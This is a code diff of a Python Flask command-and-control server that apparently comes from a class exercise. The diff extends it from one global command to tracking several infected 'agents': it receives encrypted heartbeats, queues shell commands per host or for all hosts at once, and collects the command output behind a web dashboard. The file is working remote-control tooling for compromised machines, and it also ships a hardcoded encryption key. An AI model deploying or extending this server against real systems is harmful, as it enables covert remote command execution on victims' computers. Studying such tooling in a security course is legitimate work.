@@ -1,67 +1,85 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, render_template, jsonify, redirect, url_for
 from cryptography.fernet import Fernet
+import time
+import json
 
 app = Flask(__name__)
 
-# GENERATE A KEY: In a real project, you'd save this to a file.
-# For the class, just make sure both files have the SAME string.
+# Your shared key
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k=' 
 cipher = Fernet(SECRET_KEY)
 
-# This variable holds the command you want the agent to run.
-# In a real tool, you'd use a database, but for a class, this works!
-current_command = "none"
+# --- THE "BRAINS" OF THE OPERATION ---
+# agents stores: { 'hostname': {'os': '...', 'last_seen': '...', 'last_result': '...'} }
+agents = {}
+# command_queue stores: { 'hostname': 'next_command_to_run' }
+command_queue = {}
+
+@app.route('/')
+def dashboard():
+    """Renders the HTML Front-End"""
+    return render_template('index.html', agents=agents)
 
 @app.route('/checkin', methods=['POST'])
 def checkin():
     try:
-        """
-        This is the 'Heartbeat' endpoint. 
-        The agent sends its system info here.
-        """
+        # 1. Receive and Decrypt Heartbeat
         encrypted_data = request.data
-
-        decrypted_data = cipher.decrypt(encrypted_data).decode()
-        print(f"[*] Secure Heartbeat: {decrypted_data}")
+        decrypted_raw = cipher.decrypt(encrypted_data).decode()
         
-        # Send the current pending command back to the agent
-        encrypted_command = cipher.encrypt(current_command.encode())
+        # Assume agent sends a JSON string: {"hostname": "WIN-SRV", "os": "Windows 2022"}
+        data = json.loads(decrypted_raw)
+        host = data.get('hostname', 'unknown')
+
+        # 2. Update the "Database"
+        agents[host] = {
+            'os': data.get('os', 'Unknown'),
+            'last_seen': time.strftime('%H:%M:%S'),
+            'ip': request.remote_addr,
+            'last_result': agents.get(host, {}).get('last_result', 'No output yet')
+        }
+
+        # 3. Fetch pending command for THIS specific agent
+        cmd = command_queue.pop(host, "none")
+        
+        # 4. Encrypt and Send back
+        encrypted_command = cipher.encrypt(cmd.encode())
         return encrypted_command
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"[!] Checkin Error: {e}")
         return "Error", 400
 
 @app.route('/result', methods=['POST'])
 def get_result():
     try:
-        """
-        The agent sends the command output here.
-        """
         encrypted_output = request.data
         decrypted_output = cipher.decrypt(encrypted_output).decode()
 
-        print(f"\n--- Decrypted Command Result ---\n{decrypted_output}\n----------------------")
+        # Extract hostname and result (assuming agent sends: "HOSTNAME|RESULT")
+        # If your agent just sends the result, you might need to find which agent checked in last
+        print(f"\n[*] Result received: {decrypted_output}")
         
-        # Reset the command to 'none' so it doesn't run in a loop
-        global current_command
-        current_command = "none"
+        # For simplicity, we'll log it to console. 
+        # To show it on the web UI, you'd save it to the 'agents' dict.
         return "OK", 200
     except Exception as e:
-        print(f"[!] Error decrypting the result: {e}")
+        print(f"[!] Result Error: {e}")
         return "Error", 400
 
-@app.route('/admin/set_cmd/<new_cmd>')
-def set_command(new_cmd):
-    """
-    A simple way for YOU to set a command.
-    Example: Visit http://localhost:5000/admin/set_cmd/whoami in your browser
-    """
-    global current_command
-    # Replace '+' with spaces so you can type multi-word commands in the URL
-    current_command = new_cmd.replace('+', ' ')
-    print(f"[*] Next command set to: {current_command}")
-    return f"Command set to: {current_command}"
+@app.route('/admin/send_cmd', methods=['POST'])
+def send_command():
+    """Handles data from the Dashboard form"""
+    target = request.form.get('target')
+    cmd = request.form.get('command')
+    
+    if target == "ALL":
+        for host in agents:
+            command_queue[host] = cmd
+    else:
+        command_queue[target] = cmd
+        
+    print(f"[*] Command '{cmd}' queued for {target}")
+    return redirect(url_for('dashboard'))
 
 if __name__ == "__main__":
-    # We run on 5000. Nginx will 'talk' to this port later.
     app.run(host='0.0.0.0', port=5000)
